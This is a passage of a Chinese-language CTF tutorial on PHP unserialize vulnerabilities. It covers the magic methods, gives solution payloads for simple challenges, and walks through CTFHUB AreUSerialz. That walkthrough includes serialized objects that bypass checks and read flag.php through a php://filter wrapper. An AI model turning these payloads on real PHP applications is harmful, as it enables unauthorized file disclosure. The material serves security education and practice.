class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = (serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;*op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;*filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;*content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>实际上是输出导致了不可见字符 <code>\x00</code> 的丢失</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#实际上是</span></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;%00*%00op&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;%00*%00filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;%00*%00content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="1-3-php-反序列化的触发"><a href="#1-3-php-反序列化的触发" class="headerlink" title="1.3 php 反序列化的触发"></a>1.3 php 反序列化的触发</h2><p><strong>触发条件：</strong></p><p>unserialize() 函数 的变量可控，文件当中存在可利用的类，类中存在魔术方法</p><p><strong>常见魔术方法：魔术方法就是 php 在进行有关类中变量序列化以及反序列化相关操作是会自动被调用的一些方法（函数）</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() <span class="comment">//使用unserialize时触发 </span></span><br><span class="line">__sleep() <span class="comment">//使用serialize时触发 </span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call()    <span class="comment">//在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 </span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发 </span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据 </span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性 </span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发 </span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把 一个对象 当作 字符串 使用时触发 </span></span><br><span class="line">    <span class="comment">//例如：echo 对象; $text=$test+$对象； </span></span><br><span class="line">__invoke() <span class="comment">//当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">其它魔术方法</a></p><p>理解魔术方法的调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr1</span>=<span class="string">&quot;abc&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$varr2</span>=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;varr1.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__construct&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__destruct&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;__toString&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__sleep&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;varr1&#x27;</span>,<span class="string">&#x27;varr2&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;__wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> test();  <span class="comment">//实例化对象，调用__construct()方法，输出__construct</span></span><br><span class="line"><span class="variable">$obj</span>-&gt;echoP();   <span class="comment">//调用echoP()方法，输出&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>;    <span class="comment">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span></span><br><span class="line"><span class="variable">$s</span> =serialize(<span class="variable">$obj</span>);  <span class="comment">//obj对象被序列化，调用__sleep()方法，输出__sleep</span></span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$s</span>);  <span class="comment">//$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。</span></span><br><span class="line"><span class="comment">// 脚本结束又会调用__destruct()方法，输出__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/g1OCJhFiYa7s8yk.png" alt="image-20210910213239299"></p><h2 id="1-4-无类简单题目"><a href="#1-4-无类简单题目" class="headerlink" title="1.4 无类简单题目"></a>1.4 无类简单题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;Love&quot;</span>;</span><br><span class="line">    <span class="variable">$str1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(unserialize(<span class="variable">$str1</span>) === <span class="variable">$str</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//WP:?str1=s:4:&quot;Love&quot;;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;ISecer&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(unserialize(<span class="variable">$cookie</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;admin.css&quot;</span> type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">align</span>=&quot;<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;#&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">user</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot;&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;&lt;<span class="title">input</span> <span class="title">value</span>=&quot;<span class="title">Login</span>&quot; <span class="title">type</span>=&quot;<span class="title">button</span>&quot;/&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">$<span class="title">KEY</span>=&#x27;<span class="title">ISecer</span>:<span class="title">www</span>.<span class="title">isecer</span>.<span class="title">com</span>&#x27;;</span></span><br><span class="line"><span class="class">?&gt; </span></span><br><span class="line"><span class="class">//<span class="title">WP</span>:<span class="title">cookie</span>:<span class="title">ISecer</span>=<span class="title">s</span>:0:&quot;&quot;;</span></span><br><span class="line"><span class="class">    //顺序问题</span></span><br></pre></td></tr></table></figure><h2 id="1-5-有类简单题目"><a href="#1-5-有类简单题目" class="headerlink" title="1.5 有类简单题目"></a>1.5 有类简单题目</h2><p>触发魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__construct <span class="comment">//创建对象时触发</span></span><br><span class="line">__destruct <span class="comment">//对象被销毁时 触发 使用unserialize时触发</span></span><br><span class="line">__toString <span class="comment">//echo 或者 拼接字符串或者其它隐式调用该方法的操作都会被触发</span></span><br><span class="line">__wakeup() <span class="comment">//使用unserialize时触发 </span></span><br><span class="line">__sleep() <span class="comment">//使用serialize时触发 </span></span><br><span class="line">__call()    <span class="comment">//在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 </span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发 </span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据 </span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性 </span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发 </span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发 echo 对象; $text=$test+$对象； </span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><p>魔术方法参考：<a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></p><h2 id="1-5-CTF-题目"><a href="#1-5-CTF-题目" class="headerlink" title="1.5 CTF 题目"></a>1.5 CTF 题目</h2><h3 id="1-5-1-CTFHUB-AreUSerialz"><a href="#1-5-1-CTFHUB-AreUSerialz" class="headerlink" title="1.5.1 CTFHUB AreUSerialz"></a>1.5.1 CTFHUB AreUSerialz</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//传参</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">解释：</span><br><span class="line">1.?str传参，绕过is_valid() 之后，进行反序列化unserialize(<span class="variable">$str</span>)，</span><br><span class="line">  传入类对象的序列化值，将会触发 __construct() ，最后销毁对象时，会触发 __destruct()</span><br><span class="line">2. __construct() 对变量初始化操作</span><br><span class="line">3. __destruct() op值对比：2的话强制转换成1；</span><br><span class="line">4.调用process()函数</span><br><span class="line">5.op == <span class="string">&quot;1&quot;</span>为写内容；op == <span class="string">&quot;2&quot;</span>为读取内容</span><br><span class="line">6.我们需要读取到 flag.php文件当中的内容，应该越过 3. 中对op的检测</span><br><span class="line">  可以使用 弱类型绕过 op=空格2 或者是 op=数字2 来越过===</span><br><span class="line">7.这样即使使用的不是字符串2，也可以满足==的条件，从而读取到内容</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>; <span class="comment">//空格 2</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = serialize(<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;s:2:&quot; 2&quot;;s:11:&quot;*filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;*content&quot;;N;&#125;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p><strong>易错：</strong></p><p>​        <em><em>protected权限的变量在序列化的时会有%00</em>%00字符</em>*，%00字符的ASCII码为0，就无法通过上面的 is_valid函数校验。</p><p><strong>解决办法1：</strong> <strong>php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line">    public <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    public <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    public <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = new FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = urlencode(serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>解决办法2：</strong> <strong>%00更改为 \00，s 更改为 S</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = urlencode(serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//将所得到的内容中 %00更改为 \00，s 更改为 S</span></span><br><span class="line"><span 